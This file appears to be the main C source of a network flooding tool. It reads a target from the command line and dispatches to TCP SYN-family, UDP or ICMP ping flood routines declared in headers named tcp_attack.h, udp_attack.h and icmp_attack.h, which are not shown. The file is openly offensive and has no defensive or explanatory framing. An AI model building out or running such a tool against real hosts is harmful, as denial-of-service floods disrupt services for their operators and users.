#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "tcp_attack.h"
#include "udp_attack.h"
#include "icmp_attack.h"
#include "http_attack.h"
#include "utils.h"
#include "types.h"

struct target_data target;

void signal_exit()
{
	fprintf(stdout, "%s\nstopped attack.\n%s", COLOR_GREEN, COLOR_RESET);
	close(target.sockfd);
	exit(EXIT_SUCCESS);
}

int main(int argc, char *argv[])
{
	memset(&target, 0, sizeof(struct target_data));

	parse_args(argc, argv, &target);
	init_signal(&signal_exit);

	if (target.attack_type >= ATTACK_TCP_SYN && target.attack_type <= ATTACK_TCP_NULL) {
		attack_tcp(&target);
	} else if (target.attack_type == ATTACK_UDP) {
		attack_udp(&target);
	} else if (target.attack_type == ATTACK_ICMP_PING) {
		attack_icmp(&target);
	}

	return 0;
}
